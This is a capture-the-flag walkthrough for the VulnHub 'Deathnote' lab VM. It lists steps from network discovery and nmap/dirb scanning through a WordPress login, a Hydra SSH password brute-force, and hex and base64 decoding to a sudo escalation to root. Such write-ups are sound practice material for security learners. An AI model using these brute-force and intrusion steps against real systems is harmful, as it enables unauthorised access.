# Deathnote-CTF

## Writeup for the Death note CTF 

Downloadlink : 
https://download.vulnhub.com/deathnote/Deathnote.ova

## Objective: Gain root access ## 

1) Locate vulnerable machine IP address by using *netdiscover*  **Ip : 192.168.18.15** (^ip address will be diffrent on your machine) 
2) Scan for open ports using *NMAP.* **nmap -sV -p- -v 192.168.18.15**

 **-nmap results-**

 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

 80/tcp open  http    Apache httpd 2.4.38 ((Debian))

3) Unable to access website. Edit the /etc/hosts file with the machine ip and name 192.168.18.15 , deathnote.vuln

4) Explore the website and find the hint link , found the user kira and L and another info that could be potentially be a password "my fav line is iamjustic3"

5) Use *DIRB* tool to explore http port. **: dirb http: //192.168.18.15** 

6) Use the **http: //192.168.18.15/robots.txt to see a clue**

7) Clue given : added hint on /important.jpg

8) Use **curl http://192.168.18.15/important.jpg**

   *"i can only help you by giving something important*

   *login username : user.txt*

   *i don't know the password.*

   *find it by yourself*
 
   *but i think it is in the hint section of site"*

9) From the dirb results find the admin directory **http: //192.168.18.15/wordpress/wp-admin/**

10) Enter **kira** as username and password **iamjustic3**

11) Go to the media libary and copy the link for the notes.txt 

12) wget http: //deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt and cat the file. A list of passwords will be shown. 

13) Use the *HYDRA* tool to brute force the user "l" on **ssh hydra -l l -P notes.txt 192.168.18.15 ssh**

14) Once inside head to the opt directory and then L directory will present with 2 files. A clue stating to use cybercheck which is online decoder and another file that has       hexcode

  **63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d**

14) Head to cyberchef and decode the code via hex 

   **cGFzc3dkIDoga2lyYWlzZXZpbCA=**

15) Decode the code again via base64

   *passwd : kiraisevil* 

16) Change user to kira with password kiraisevil **su -l kira**

17) Check kira persmissions 

    *User kira may run the following commands on deathnote:*
    
    *(ALL : ALL) ALL*

    *uid=1001(kira) gid=1001(kira) groups=1001(kira),27(sudo)*

18) Gain root access with **sudo su -l** 

19) cat the root.txt file for the finale 

![alt text](https://github.com/Persecure/Deathnote-CTF/blob/main/flag.PNG?raw=true)

End 

